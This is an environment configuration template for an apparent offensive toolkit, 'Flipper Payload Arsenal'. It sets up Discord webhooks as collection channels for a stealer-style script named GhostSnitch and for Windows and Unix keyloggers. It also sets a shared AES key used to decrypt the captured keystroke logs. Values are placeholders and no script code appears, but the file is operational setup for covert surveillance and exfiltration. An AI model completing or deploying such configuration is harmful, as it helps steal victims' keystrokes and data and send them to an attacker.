# =============================================================================
# Flipper Payload Arsenal — Environment Configuration
# =============================================================================
# Copy this file to .env and fill in your values.
# NEVER commit .env to version control.
# =============================================================================

# -----------------------------------------------------------------------------
# Discord Server
# -----------------------------------------------------------------------------
DISCORD_SERVER_NAME="Flipper Payload Arsenal"
DISCORD_BANNER_COLOR="#00ff41"

# -----------------------------------------------------------------------------
# Webhook URLs
# Create each webhook in Discord:
#   Channel Settings → Integrations → Webhooks → New Webhook → Copy URL
# -----------------------------------------------------------------------------

# #ghostsnitch-reports — GhostSnitch.ps1 and GhostSnitch_Stealth.ps1
DISCORD_WEBHOOK_GHOSTSNITCH="https://discord.com/api/webhooks/REPLACE_ME"

# #keylogger-windows — keylogger.ps1
DISCORD_WEBHOOK_KEYLOGGER_WINDOWS="https://discord.com/api/webhooks/REPLACE_ME"

# #keylogger-unix — keylogger_unix.sh
DISCORD_WEBHOOK_KEYLOGGER_UNIX="https://discord.com/api/webhooks/REPLACE_ME"

# -----------------------------------------------------------------------------
# Channel IDs (optional — useful if building a bot or dashboard later)
# Right-click a channel → Copy Channel ID (requires Developer Mode enabled)
# -----------------------------------------------------------------------------
DISCORD_CHANNEL_GHOSTSNITCH_REPORTS="REPLACE_ME"
DISCORD_CHANNEL_KEYLOGGER_WINDOWS="REPLACE_ME"
DISCORD_CHANNEL_KEYLOGGER_UNIX="REPLACE_ME"

# -----------------------------------------------------------------------------
# Encryption
# Change this before deploying — must match the key in keylogger.ps1 ($key)
# and keylogger_unix.sh ($KEY) to decrypt logs correctly.
# -----------------------------------------------------------------------------
KEYLOGGER_AES_KEY="REPLACE_ME"
